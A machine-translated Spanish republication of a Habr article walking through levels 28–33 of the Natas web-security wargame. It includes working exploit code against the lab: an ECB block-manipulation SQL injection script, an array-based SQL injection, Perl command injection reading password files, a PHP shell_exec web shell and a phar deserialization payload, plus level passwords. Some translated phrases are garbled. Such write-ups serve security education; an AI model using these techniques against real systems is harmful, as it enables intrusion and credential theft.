<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üö∂ üçá üëâüèº Natas Web. Paso de la plataforma CTF destinada a explotar vulnerabilidades web. Parte 5 ü§±üèΩ üßóüèª üìê</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="En este art√≠culo, trataremos el funcionamiento de algunas identidades WEB utilizando el juego de guerra Natas como ejemplo. Cada nivel tiene acceso a ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Natas Web. Paso de la plataforma CTF destinada a explotar vulnerabilidades web. Parte 5</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/465363/"><img src="https://habrastorage.org/webt/_-/zf/_u/_-zf_uvvs6ypsybfrqslsnqwx8k.png" alt="imagen"><br><br>  En este art√≠culo, trataremos el funcionamiento de algunas identidades WEB utilizando el juego de guerra <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Natas</a> como ejemplo.  Cada nivel tiene acceso a la contrase√±a del siguiente nivel.  Todas las contrase√±as tambi√©n se almacenan en los archivos / etc / natas_webpass /.  Por ejemplo, la contrase√±a para natas5 se almacena en el archivo / etc / natas_webpass / natas5 y es de solo lectura para los usuarios natas4 y natas5. <br><br>  Partes pasadas: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">parte 1</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">parte 2</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">parte 3</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">parte 4</a> . <br><a name="habracut"></a><br><div class="spoiler">  <b class="spoiler_title">Informaci√≥n organizacional</b> <div class="spoiler_text">  Especialmente para aquellos que desean aprender algo nuevo y desarrollarse en cualquiera de las √°reas de informaci√≥n y seguridad inform√°tica, escribir√© y hablar√© sobre las siguientes categor√≠as: <br><br><ul><li>  PWN; </li><li>  criptograf√≠a (criptograf√≠a); </li><li>  tecnolog√≠as de red (Red); </li><li>  inversa (ingenier√≠a inversa); </li><li>  esteganograf√≠a (Stegano); </li><li>  b√∫squeda y explotaci√≥n de vulnerabilidades WEB. </li></ul><br>  Adem√°s de esto, compartir√© mi experiencia en inform√°tica forense, an√°lisis de malware y firmware, ataques a redes inal√°mbricas y redes de √°rea local, realizaci√≥n de pentests y escritura de exploits. <br><cut></cut><br>  Para que pueda conocer nuevos art√≠culos, software y otra informaci√≥n, cre√© un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">canal en Telegram</a> y un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">grupo para discutir cualquier problema</a> en el campo de ICD.  Adem√°s, considerar√© personalmente sus solicitudes personales, preguntas, sugerencias y recomendaciones <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">personalmente y responder√© a todos</a> . <br><br>  Toda la informaci√≥n se proporciona solo con fines educativos.  El autor de este documento no tiene ninguna responsabilidad por los da√±os causados ‚Äã‚Äãa alguien como resultado del uso del conocimiento y los m√©todos obtenidos como resultado de estudiar este documento. <br></div></div><br><h2>  nivel 28 </h2><br>  Al enviar cualquier solicitud, vemos una redirecci√≥n a otra p√°gina con una solicitud extra√±a y codificaci√≥n base64, cuya decodificaci√≥n no da nada. <br><br><img src="https://habrastorage.org/webt/cf/zj/qx/cfzjqxoth5dlerlwy-jstxfyd3a.png" alt="imagen"><br><br>  Enviaremos cualquier solicitud de consulta.  Recibimos un error que deja en claro que la redirecci√≥n utiliza cifrado y en esta p√°gina la solicitud se descifra antes de transferirse a la base de datos.  Es decir, necesitamos cifrar nuestra inyecci√≥n y enviarla al servidor, pero no conocemos la clave.  Pero tenemos un encriptador: este es el servidor. <br><br><img src="https://habrastorage.org/webt/qr/pu/ox/qrpuox4rcgdtxne4znoewsryctm.png" alt="imagen"><br><br>  Primero, tratemos con el cifrado.  Enviaremos dos l√≠neas diferentes "qwerty" y "asdfgh" y analizaremos c√≥mo se convertir√°n. <br><br><img src="https://habrastorage.org/webt/7h/d4/yh/7hd4yh_jjeypqqz69jn2eimnrnc.png" alt="imagen"><br><br>  En respuesta, obtenemos l√≠neas id√©nticas, que en cierto lugar tienen una secuencia distintiva.  Dado que el principio y el final de dos PC (texto cifrado) son iguales, podemos sacar las siguientes conclusiones: <br><br><ul><li>  Se utiliza el complemento inicial de OT (texto sin formato); </li><li>  hay una adici√≥n final a OT; </li><li>  Se utiliza el modo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">ECB</a> , ya que en diferentes OT los √∫ltimos bloques del CT son iguales, es decir, los bloques son independientes entre s√≠. </li></ul><cut></cut><br>  La idea es esta: enviamos una consulta a la base de datos para el cifrado, pero se convertir√° y, por lo tanto, al descifrar, la inyecci√≥n no pasar√°.  Es necesario lidiar con los complementos para calcular con precisi√≥n los bloques donde se cifrar√° nuestra carga √∫til.  Luego, despu√©s del cifrado, tomaremos nuestros bloques de la solicitud y los enviaremos solo al servidor.  En el servidor se descifrar√°n y, dado que no tienen complementos, se ejecutar√°n. <br><br>  La idea se presenta en cuatro im√°genes: <br><br><ol><li>  Presentaci√≥n de 5 bloques. </li><li>  Un codificador con adiciones iniciales y finales que encriptan una cadena vac√≠a. </li><li>  Cifrado de la cadena "TEXTTEXTTEXTTEXT". </li><li>  Eliminamos las adiciones agregando la cantidad requerida de caracteres antes y despu√©s de nuestra l√≠nea para ponerla en un bloque separado.  Tomamos de la PC solo el segundo bloque. </li></ol><br><img src="https://habrastorage.org/webt/6x/az/z6/6xazz648f0cgitqajlo-m7eksi0.png" alt="imagen"><br><br>  ¬°De esta manera, recibimos solo nuestra cadena encriptada en una clave desconocida para nosotros! <br><br>  Datos necesarios: <br><br><ol><li>  Modo de cifrado (conocido - BCE) </li><li>  Longitud del bloque (conocido - 16) </li><li>  <b>Longitud del complemento inicial (desconocido)</b> </li><li>  La longitud de nuestro texto (conocido - "SELECCIONAR contrase√±a <br>  COMO broma de los usuarios ") </li></ol><br>  Es necesario averiguar la longitud del llenado inicial.  Como los dos primeros bloques son iguales, enviaremos un n√∫mero diferente de caracteres, y tan pronto como el tercer bloque deje de cambiar, encontraremos el n√∫mero de caracteres necesarios para complementarlo.  Estos son 10 personajes.  A continuaci√≥n se muestra una implementaci√≥n del algoritmo anterior. <br><br><pre><code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> base64 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> urlparse <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urlsplit <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> urllib2 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> unquote <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ChiperQuery</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(url, auth, query)</span></span></span><span class="hljs-function">:</span></span> resp = requests.post(url, auth=auth, data={<span class="hljs-string"><span class="hljs-string">'query'</span></span>: query}) query_param = unquote(urlsplit(resp.url)[<span class="hljs-number"><span class="hljs-number">3</span></span>][<span class="hljs-number"><span class="hljs-number">6</span></span>:]) byte_decode_query = bytearray(base64.b64decode(query_param)) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> byte_decode_query <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SendPayload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(url, auth, payload)</span></span></span><span class="hljs-function">:</span></span> enc_payload = base64.b64encode(bytes(payload)) ret = requests.get(url + <span class="hljs-string"><span class="hljs-string">'/search.php'</span></span>, auth=auth, params={<span class="hljs-string"><span class="hljs-string">'query'</span></span>: enc_payload}) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> ret.text url = <span class="hljs-string"><span class="hljs-string">"http://natas28.natas.labs.overthewire.org/"</span></span> auth = requests.auth.HTTPBasicAuth(<span class="hljs-string"><span class="hljs-string">"natas28"</span></span>, <span class="hljs-string"><span class="hljs-string">"JWwR438wkgTsNKBbcJoowyysdM82YjeF"</span></span>) query = <span class="hljs-string"><span class="hljs-string">"SELECT password AS joke FROM users"</span></span> query += <span class="hljs-string"><span class="hljs-string">" "</span></span> * (<span class="hljs-number"><span class="hljs-number">16</span></span>-len(query)%<span class="hljs-number"><span class="hljs-number">16</span></span>) plaintext = <span class="hljs-string"><span class="hljs-string">'b'</span></span>*<span class="hljs-number"><span class="hljs-number">10</span></span> + query + chr(<span class="hljs-number"><span class="hljs-number">16</span></span>)*<span class="hljs-number"><span class="hljs-number">16</span></span> chip_query = ChiperQuery(url, auth, plaintext) st_pos = len(query) count = st_pos+<span class="hljs-number"><span class="hljs-number">16</span></span> result = SendPayload(url, auth, chip_query[st_pos:st_pos+count]) print(result)</code> </pre> <br><img src="https://habrastorage.org/webt/hr/7g/jr/hr7gjrd3jg6_nqv_luh8pg1l7fm.png" alt="imagen"><br><br>  Obtenemos la contrase√±a. <br><br><h2>  nivel 29 </h2><br>  Es dif√≠cil adivinar que el c√≥digo perl llama a la funci√≥n de l√≠nea de comando y pasa los comandos especificados en el archivo de datos (que puede seleccionar) al comando.  El hecho es que podemos cerrar la tuber√≠a desde "exec |  read_command_file "en" exec |  read_command |  our_smd_command ". <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a21/389/622/a21389622a7c7611aed78ae6678fd996.png" alt="imagen"><br><br>  Pero el hecho es que nuestro equipo se mostrar√° en la consola y no en el sitio.  Para hacer esto, agregue el siguiente comando para reemplazar los caracteres en las secuencias de entrada / salida: ‚Äú|  tr `antes` despu√©s`. <br><br><img src="https://habrastorage.org/webt/f3/rw/ry/f3rwrykfdv8obdr3cx1huxxissy.png" alt="imagen"><br><br>  Como se completa el comando, leeremos la contrase√±a del archivo especificado.  Pero se nos dice que no podemos hacer esto ... <br><br><img src="https://habrastorage.org/webt/f3/rw/ry/f3rwrykfdv8obdr3cx1huxxissy.png" alt="imagen"><br><br>  Utilizaremos el filtrado de la l√≠nea de comando e insertaremos comillas en cualquier lugar que se borrar√° cuando se ejecute el comando. <br><br><img src="https://habrastorage.org/webt/1h/a-/2-/1ha-2-9b0klpqpjytwvshd_6n7u.png" alt="imagen"><br><br>  Le quitamos la contrase√±a. <br><br><h2>  nivel 30 </h2><br>  Veamos el c√≥digo fuente.  Aqu√≠ se usa el m√©todo quote (), que escapa a todos los caracteres especiales en una cadena.  Pero se escapa exactamente en la cadena, lo que nos da el derecho de operar la inyecci√≥n, si usamos, por ejemplo, una matriz (en este caso, se aceptar√° un elemento cero). <br><br><img src="https://habrastorage.org/webt/6r/2u/zq/6r2uzq4fn67dpsswpqhqihjtuna.png" alt="imagen"><br><br>  Propongamos una carga para la solicitud. <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">Select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username = <span class="hljs-string"><span class="hljs-string">'username'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">'password'</span></span>;</code> </pre> <br>  Como sabemos que el nombre de usuario es natas31, introducimos la condici√≥n correcta en la contrase√±a: '' o 1. Entonces nuestra solicitud ser√° as√≠ <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">Select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username = <span class="hljs-string"><span class="hljs-string">'natas31'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>;</code> </pre> <br>  Y ahora queda por enviar una matriz. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests url = <span class="hljs-string"><span class="hljs-string">"http://natas30.natas.labs.overthewire.org/index.pl"</span></span> s = requests.Session() s.auth = (<span class="hljs-string"><span class="hljs-string">'natas30'</span></span>, <span class="hljs-string"><span class="hljs-string">'wie9iexae0Daihohv8vuu3cei9wahf0e'</span></span>) args = { <span class="hljs-string"><span class="hljs-string">"username"</span></span>: <span class="hljs-string"><span class="hljs-string">"natas31"</span></span>, <span class="hljs-string"><span class="hljs-string">"password"</span></span>: [<span class="hljs-string"><span class="hljs-string">"'' or 1"</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>] } r = s.post(url, data=args) print(r.text)</code> </pre> <br><img src="https://habrastorage.org/webt/k6/wz/l8/k6wzl8ddxaiazmonwchc3yqa6q8.png" alt="imagen"><br><br>  Le quitamos la contrase√±a. <br><br><h2>  nivel 31 </h2><br>  La esencia del servicio se aclara de inmediato: del archivo csv obtenemos la tabla en html. <br><br><img src="https://habrastorage.org/webt/lu/gy/ob/lugyobitqxvszjjwdv8mgyzze6a.png" alt="imagen"><br><br>  Veamos el c√≥digo fuente. <br><br><img src="https://habrastorage.org/webt/72/h7/jn/72h7jnap6hzndui_h8p_wye_3ku.png" alt="imagen"><br><br>  Entonces, ¬øqu√© es lo m√°s interesante: es la l√≠nea while (&lt;$ archivo&gt;), mientras que el archivo es la l√≠nea del par√°metro.  Por lo tanto, es posible ejecutar el c√≥digo. <br><br><img src="https://habrastorage.org/webt/hl/lm/yc/hllmyc4nlzsuw5-wzhh1airgewa.png" alt="imagen"><br><br>  Env√≠e cualquier archivo csv e intercepte la solicitud en Burp Suite. <br><br><img src="https://habrastorage.org/webt/hl/lm/yc/hllmyc4nlzsuw5-wzhh1airgewa.png" alt="imagen"><br><br>  Ahora agreguemos el comando como par√°metro. <br><pre> <code class="bash hljs">?/bin/cat%20/etc/natas_webpass/natas32%20|</code> </pre> <br><br><img src="https://habrastorage.org/webt/se/b9/pz/seb9pziilk6q0nyxsnucujmsx1w.png" alt="imagen"><br><br>  Para llamar a la carga desde el par√°metro, agregue las siguientes l√≠neas: <br><br><pre> <code class="plaintext hljs">-----------------------------716973545450730846281908502 Content-Disposition: form-data; name="file"; Content-Type: text/csv ARGV</code> </pre> <br><img src="https://habrastorage.org/webt/-n/fl/ml/-nflmldwytfowae7hvsi8m02fl8.png" alt="imagen"><br><br><img src="https://habrastorage.org/webt/7k/dx/rd/7kdxrdmfwgzlbbkdyuxt3rstck4.png" alt="imagen"><br><br>  Obtenemos la contrase√±a. <br><br><h2>  nivel 32 </h2><br>  Abrimos la p√°gina donde se nos dice que necesitamos probar la ejecuci√≥n del c√≥digo y ejecutar el archivo webroot. <br><br><img src="https://habrastorage.org/webt/eg/it/df/egitdfbigqtdo792neb11yw39o8.png" alt="imagen"><br><br>  Si observa el c√≥digo, es exactamente el mismo que en el nivel anterior.  Luego explotamos la vulnerabilidad como la √∫ltima vez.  Busquemos el archivo webroot.  Para hacer esto, mire el directorio, usando como carga: ls -la | <br><br><img src="https://habrastorage.org/webt/a-/uy/el/a-uyelts3nbtxtzohnb0hte-t0o.png" alt="imagen"><br><br>  Obtenga la lista de archivos.  Webroot no est√° all√≠, pero hay un extra√±o programa getpassword. <br>  Lo llevamos a cabo. <br><br><img src="https://habrastorage.org/webt/iv/iv/8f/iviv8f54cgrlx9j_glp770jng5g.png" alt="imagen"><br><br><img src="https://habrastorage.org/webt/jz/3j/ok/jz3jok9oavuzhsr3iqric_wodfi.png" alt="imagen"><br><br>  Obtenemos la contrase√±a para el √∫ltimo nivel. <br><br><img src="https://habrastorage.org/webt/dk/wm/vg/dkwmvgv2nnaaahnlnbbfcr97beo.png" alt="imagen"><br><br><h2>  nivel 33 </h2><br>  Nuevamente el formulario de carga de archivos. <br><br><img src="https://habrastorage.org/webt/mr/e4/hq/mre4hqlkvws3uidhslqgmgvu3va.png" alt="imagen"><br><br>  Veamos el c√≥digo fuente. <br><br><img src="https://habrastorage.org/webt/-f/co/l9/-fcol9z_26on8wkfft6ndoktpny.png" alt="imagen"><br><br>  Por lo tanto, debemos cargar un archivo de hasta 4 MB de tama√±o en el servidor y si md5 del contenido del archivo es igual al valor de referencia, se ejecutar√° en el int√©rprete php.  Nosotros miramos m√°s all√°.  Podemos controlar el nombre del archivo y su contenido. <br><br><img src="https://habrastorage.org/webt/-e/lm/0g/-elm0gr1nbqnwi7wrm8sazsdcdy.png" alt="imagen"><br><br>  Dir√© de inmediato que esta es una vulnerabilidad compleja que conoc√≠ hace medio a√±o.  Est√° dirigido al hecho de que podemos cargar un archivo de cualquier tipo al servidor y cualquier operaci√≥n se realizar√° con su contenido.  Acerca de los archivos phar se escribe <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> .  En resumen, un archivo php especial que representa datos serializados.  En este caso, leer la secuencia phar conducir√° a la ejecuci√≥n del c√≥digo.  Por lo tanto, puede serializar el c√≥digo y enviarlo al servidor.  Al calcular md5, se leer√° una secuencia, lo que conducir√° a la ejecuci√≥n del c√≥digo. <br><br>  Entonces, primero cree un archivo php que lea la bandera. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> shell_exec(<span class="hljs-string"><span class="hljs-string">'cat /etc/natas_webpass/natas34'</span></span>); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  Subirlo al servidor.  No olvides cambiar el nombre en Burp Suite. <br><br><img src="https://habrastorage.org/webt/d9/uk/v5/d9ukv57ubafrgtsvr5now1xevao.png" alt="imagen"><br><br><img src="https://habrastorage.org/webt/fp/3q/3c/fp3q3cisij3xvyjy6qnzgq0efjc.png" alt="imagen"><br><br>  Recibimos la respuesta del servidor ... Ok.  Ahora cree un archivo phar que, cuando se ejecute, cambiar√° los valores que necesitamos (el hash siempre ser√° correcto y el nombre del archivo que ya se ha cargado en el servidor).  Entonces pasaremos la verificaci√≥n y el servidor ejecutar√° shell.php. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Shell</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $filename = <span class="hljs-string"><span class="hljs-string">"shell.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $signature = <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $init = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; } $phar = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Phar(<span class="hljs-string"><span class="hljs-string">"shell.phar"</span></span>); $phar-&gt;startBuffering(); $phar-&gt;addFromString(<span class="hljs-string"><span class="hljs-string">"123.txt"</span></span>, <span class="hljs-string"><span class="hljs-string">'123'</span></span>); $phar-&gt;setStub(<span class="hljs-string"><span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span></span>); $s = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Shell(); $phar-&gt;setMetadata($s); $phar-&gt;stopBuffering(); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  Antes de compilar el archivo /etc/php/xx/php.ini, debe cambiar el par√°metro phar.readonly a Off. <br><br><img src="https://habrastorage.org/webt/5b/-f/wn/5b-fwntum8gegivytyszgod64j8.png" alt="imagen"><br><br>  Luego, ejecuta php shell.php y obtenemos el archivo .phar.  Lo enviamos al servidor y cambiamos el nombre. <br><br><img src="https://habrastorage.org/webt/wr/mj/vh/wrmjvhey7hmfmlq9lpfgd8bylau.png" alt="imagen"><br><br>  Entonces tenemos ambos archivos: archivo y shell.  Ahora debe hacer que el archivo se lea del archivo, lo que conducir√° a la ejecuci√≥n del c√≥digo. <br><br><img src="https://habrastorage.org/webt/yb/4w/id/yb4widil1bd9xhjzw0cdmgnjsns.png" alt="imagen"><br><br>  Obtenemos la contrase√±a. <br><br><img src="https://habrastorage.org/webt/jc/9w/oy/jc9woyxlkl8wk6wakkwzxbqzmcg.png" alt="imagen"><br><br>  Esa fue la sede de Natas.  Puedes unirte a nosotros en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Telegram</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/465363/">https://habr.com/ru/post/465363/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../465353/index.html">Auditor√≠a de seguridad de ICS</a></li>
<li><a href="../465355/index.html">Cuando 'a' no es igual a 'a'. A ra√≠z de un truco</a></li>
<li><a href="../465357/index.html">Selecci√≥n: 9 materiales √∫tiles sobre emigraci√≥n "profesional" a los Estados Unidos</a></li>
<li><a href="../465359/index.html">Huawei CloudCampus: infraestructura de servicio de alta nube</a></li>
<li><a href="../465361/index.html">Encrucijada digital de Kaz√°n: c√≥mo se introducen las tecnolog√≠as de seguridad vial en la ciudad</a></li>
<li><a href="../465365/index.html">Script de configuraci√≥n de Windows 10</a></li>
<li><a href="../465367/index.html">Qui√©n no se escondi√≥: no tengo la culpa (historial de secreto en la aviaci√≥n)</a></li>
<li><a href="../465369/index.html">Redes neuronales insensibles al peso (WANN)</a></li>
<li><a href="../465371/index.html">C√°lculo de la hip√≥tesis nula, por ejemplo, el an√°lisis de salarios de programadores ucranianos.</a></li>
<li><a href="../465373/index.html">No es una revisi√≥n del ASUS ZenBook Pro 15 UX580GE: casi un a√±o con casi la parte superior</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>